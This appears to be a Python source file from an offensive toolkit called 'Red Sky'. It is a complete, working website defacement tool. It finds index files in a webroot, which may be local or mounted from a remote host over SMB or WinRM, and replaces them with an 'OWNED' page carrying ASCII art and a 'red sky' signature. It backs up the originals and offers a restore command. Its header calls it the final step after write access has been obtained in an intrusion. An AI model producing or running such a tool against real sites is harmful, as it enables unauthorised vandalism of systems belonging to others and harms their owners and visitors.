# language: Python, file: Program/web/defacer.py, target: Red Sky web — defacer
# Drop an index.html into a webroot you have write access to. Takes a path
# (local webroot or SMB/WinRM-mounted remote), writes the page, backs up the
# original. Runs after you've already obtained write — this is the last step.

import os
import shutil
import sys
import time
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


DEFAULT_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>pwned</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #0a0000;
    color: #ff2400;
    font-family: 'Courier New', monospace;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    flex-direction: column;
    text-align: center;
  }
  h1 { font-size: 64px; letter-spacing: 8px; margin-bottom: 20px; }
  pre {
    color: #8b0000;
    font-size: 10px;
    line-height: 1;
    margin-bottom: 30px;
  }
  .sig { color: #780000; font-size: 12px; }
</style>
</head>
<body>
<pre>
██▀███  ▓█████ ▓█████▄      ██████  ██ ▄█▀▓██   ██▓
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▒██    ▒  ██▄█▒  ▒██  ██▒
▓██ ░▄█ ▒▒███   ░██   █▌   ░ ▓██▄   ▓███▄░   ▒██ ██░
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌     ▒   ██▒▓██ █▄   ░ ▐██▓░
░██▓ ▒██▒░▒████▒░▒████▓    ▒██████▒▒▒██▒ █▄  ░ ██▒▓░
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒    ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒   ██▒▒▒
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒    ░ ░▒  ░ ░░ ░▒ ▒░ ▓██ ░▒░
  ░░   ░    ░    ░ ░  ░    ░  ░  ░  ░ ░░ ░  ▒ ▒ ░░
   ░        ░  ░   ░             ░  ░  ░    ░ ░
                 ░                          ░ ░
</pre>
<h1>OWNED</h1>
<p class="sig">— red sky —</p>
</body>
</html>
"""


def _resolve_webroots(root: Path) -> List[Path]:
    """Find candidate webroot index files under root."""
    candidates = []
    for name in ("index.html", "index.htm", "index.php", "default.html"):
        p = root / name
        if p.exists():
            candidates.append(p)
    if not candidates and root.is_dir():
        # pick the first html-ish file if no obvious index
        for p in root.iterdir():
            if p.is_file() and p.suffix.lower() in (".html", ".htm"):
                candidates.append(p)
                break
    return candidates


def _write_page(target: Path, page: str, backup: bool) -> bool:
    try:
        if backup and target.exists():
            bak = target.with_suffix(target.suffix + f".bak.{int(time.time())}")
            shutil.copy2(target, bak)
            print_ok(f"backed up {target} -> {bak.name}")
        target.write_text(page, encoding="utf-8")
        # match perms to parent dir
        try:
            st = target.parent.stat()
            os.chmod(target, st.st_mode & 0o777)
        except OSError:
            pass
        print_ok(f"wrote {target}")
        return True
    except OSError as e:
        print_err(f"write failed: {e}")
        return False


def cmd_deface(path: str, page_file: str = "", backup: bool = True) -> int:
    root = Path(path).expanduser().resolve()
    if not root.exists():
        print_err(f"path not found: {root}")
        return 1
    if not root.is_dir():
        print_err(f"not a directory: {root}")
        return 1

    page = DEFAULT_PAGE
    if page_file:
        pf = Path(page_file)
        if not pf.exists():
            print_err(f"page file not found: {page_file}")
            return 1
        page = pf.read_text(encoding="utf-8")

    print_info(f"defacing {root}")
    print_kv("backup", backup)
    print_kv("page size", f"{len(page)} bytes")
    print()

    targets = _resolve_webroots(root)
    if not targets:
        print_warn("no index file found — writing index.html anyway")
        targets = [root / "index.html"]

    ok = 0
    for t in targets:
        if _write_page(t, page, backup):
            ok += 1

    print()
    print_kv("written", f"{ok}/{len(targets)}")
    return 0 if ok else 1


def cmd_restore(path: str) -> int:
    root = Path(path).expanduser().resolve()
    if not root.exists():
        print_err(f"path not found: {root}")
        return 1

    baks = sorted(root.glob("*.bak.*"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not baks:
        print_warn("no .bak.* files to restore from")
        return 0

    print_info(f"restoring from {baks[0].name}")
    # original is everything before the first '.bak.'
    original_name = baks[0].name.split(".bak.")[0]
    target = root / original_name
    try:
        shutil.copy2(baks[0], target)
        print_ok(f"restored {target}")
        return 0
    except OSError as e:
        print_err(f"restore failed: {e}")
        return 1


def run_cli(args: List[str]) -> int:
    if not args:
        print_err("usage: redsky web deface <webroot_path> [page_file]")
        print_err("       redsky web deface restore <webroot_path>")
        return 2
    if args[0] == "restore":
        if len(args) < 2:
            print_err("restore needs a webroot path")
            return 2
        return cmd_restore(args[1])
    page_file = args[1] if len(args) > 1 else ""
    return cmd_deface(args[0], page_file)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
